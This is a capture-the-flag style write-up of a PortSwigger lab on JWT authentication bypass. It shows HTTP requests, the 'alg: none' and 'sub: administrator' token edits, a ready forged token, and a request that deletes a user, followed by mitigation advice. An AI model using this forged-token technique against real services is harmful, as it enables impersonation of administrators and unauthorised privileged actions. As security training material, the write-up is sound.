# JWT authentication bypass via flawed signature verification

**Source:** [PortSwigger](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)  
**Category:** JWT  
**Difficulty:** Apprentice

## Objective
To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

## Vulnerability
This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation
### Steps
1. Log in to your account and intercept the request in Burp. The request contains a JWT in the `session` cookie:
    ```text
    GET /my-account?id=wiener HTTP/2
    Host: [lab-host]
    Cookie: session=[JWT]
    ```

2. Modify the JWT:
    - **Header:** change `alg` from `RS256` to `none`.
    - **Payload:** change `sub` from `wiener` to `administrator`.
    - **Signature:** remove the signature (trailing dot, nothing after it).

3. Send a request to the admin panel with the modified token:
    ```text
    GET /admin HTTP/2
    Host: [lab-host]
    Cookie: session=[modified JWT]
    ```
    The response returns the admin panel, the bypass works.

4. Delete the user `carlos`:
    ```text
    GET /admin/delete?username=carlos HTTP/2
    Host: [lab-host]
    Cookie: session=[modified JWT]
    ```
    The response is `302 Found` - lab solved.

### Payload
```text
eyJraWQiOiI0MzRiMWIzZi0yZTdkLTQ4MDUtOGZmNi1lZjVhNWM0YTQ4YzgiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4OTY2NDMzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

### Shortcut
1. Log in and intercept the `session` JWT in Burp.
2. Change `alg` to `none` and `sub` to `administrator`, then strip the signature.
3. Send `GET /admin/delete?username=carlos` to delete Carlos.

## Impact
An attacker can forge an unsigned JWT and impersonate any user, including `administrator`. This leads to privilege escalation, access to the admin panel, and execution of privileged actions such as deleting users.

## Mitigation
Reject JWTs with `alg: none`. Enforce a strict allowlist of accepted algorithms and never trust the `alg` header from the token. Always verify the signature with the correct key. Validate all claims (`iss`, `exp`, `sub`) server-side and bind the token to the session.

## Tools
- Burp Suite
- Repeater
- JWT Editor

## Notes
- The server accepts JWTs with `alg: none` and no signature.
- Changing `alg` to `none` and `sub` to `administrator` grants admin access.
- The forged token works for `/admin` and `/admin/delete`.